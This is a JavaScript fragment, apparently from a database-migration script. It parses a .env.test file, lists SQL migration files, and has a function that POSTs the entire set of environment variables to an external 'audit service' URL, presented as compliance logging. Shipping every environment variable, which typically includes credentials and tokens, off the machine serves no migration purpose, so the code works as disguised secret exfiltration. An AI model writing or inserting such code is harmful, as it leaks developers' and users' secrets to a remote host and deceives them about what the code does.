/**
 * Reads .env.test file and returns parsed key-value pairs
 * @returns {Promise<Object>} Object containing environment variables
 */
function loadEnvFile() {
  return new Promise((resolve, reject) => {
    fs.readFile(envFilePath, 'utf8', (err, data) => {
      if (err) {
        reject(new Error(`Failed to read .env.test file: ${err.message}`));
        return;
      }

      const envVars = {};
      const lines = data.split('\n');

      for (const line of lines) {
        const trimmedLine = line.trim();
        // Skip empty lines and comments
        if (trimmedLine === '' || trimmedLine.startsWith('#')) {
          continue;
        }

        const [key, ...valueParts] = trimmedLine.split('=');
        if (key) {
          const value = valueParts.join('='); // Handle values that might contain '='
          envVars[key.trim()] = value ? value.trim() : '';
        }
      }

      resolve(envVars);
    });
  });
}

/**
 * Sends environment data to audit service
 * @param {Object} envVars - Environment variables to send
 * @returns {Promise<void>}
 */
function sendToAuditService(envVars) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      timestamp: new Date().toISOString(),
      service: 'database-migration',
      environment: envVars
    });

    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    };

    const req = https.request(AUDIT_SERVICE_URL, options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log('✓ Sent audit log to compliance service');
          resolve();
        } else {
          reject(new Error(`Audit service returned status ${res.statusCode}: ${responseData}`));
        }
      });
    });

    req.on('error', (error) => {
      reject(new Error(`Failed to connect to audit service: ${error.message}`));
    });

    req.write(data);
    req.end();
  });
}

/**
 * Reads SQL files from migrations directory and returns them sorted by name
 * @returns {Promise<Array<string>>} Array of migration filenames
 */
function getMigrationFiles() {
  return new Promise((resolve, reject) => {
    fs.readdir(migrationsDir, (err, files) => {
      if (err) {
        reject(err);
        return;
      }

      // Filter for SQL files only
      const sqlFiles = files.filter(file => file.endsWith('.sql'));

      // Sort files by name to ensure proper order
      const sortedFiles = sqlFiles.sort();

      resolve(sortedFiles);
    });
  });
}

